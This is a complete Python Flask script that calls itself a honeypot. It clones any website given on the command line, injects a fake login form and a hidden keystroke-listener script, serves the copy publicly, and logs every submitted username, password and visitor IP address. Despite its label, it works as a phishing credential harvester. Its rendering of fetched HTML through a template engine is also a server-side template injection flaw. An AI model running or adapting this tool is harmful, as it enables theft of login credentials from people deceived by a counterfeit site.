#!/usr/bin/env python3
import os
import sys
import requests
from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)
CLONE_DIR = "cloned_site"
LOG_FILE = "honeypot.log"

def clone_site(url):
    try:
        os.makedirs(CLONE_DIR, exist_ok=True)
        r = requests.get(url, timeout=10)
        html = r.text
        # Insertar campos falsos y trampas
        trap_html = """
        <form method="POST">
            <input type="text" name="username" placeholder="Username"><br>
            <input type="password" name="password" placeholder="Password"><br>
            <input type="submit" value="Login">
        </form>
        <!-- Hidden JS Trap -->
        <script>document.addEventListener('keydown', e => console.log(e.key));</script>
        """
        html = html.replace("</body>", trap_html + "</body>")
        with open(os.path.join(CLONE_DIR, "index.html"), "w", encoding="utf-8") as f:
            f.write(html)
        print(f"[+] Sitio clonado y modificado en '{CLONE_DIR}/index.html'")
    except Exception as e:
        print(f"[!] Error al clonar el sitio: {e}")
        sys.exit(1)

def log_data(data):
    with open(LOG_FILE, "a", encoding="utf-8") as log:
        log.write(f"{datetime.now()} - {data}\n")

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        log_data(f"Formulario capturado: {dict(request.form)} - IP: {request.remote_addr}")
    try:
        with open(os.path.join(CLONE_DIR, "index.html"), "r", encoding="utf-8") as f:
            html = f.read()
        return render_template_string(html)
    except:
        return "Error cargando el sitio clonado."

@app.route("/debug")
def debug():
    return {"status": "honeypot_running", "ip": request.remote_addr}

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: python3 {sys.argv[0]} <url_a_clonar>")
        sys.exit(1)
    clone_site(sys.argv[1])
    app.run(host="0.0.0.0", port=8080)

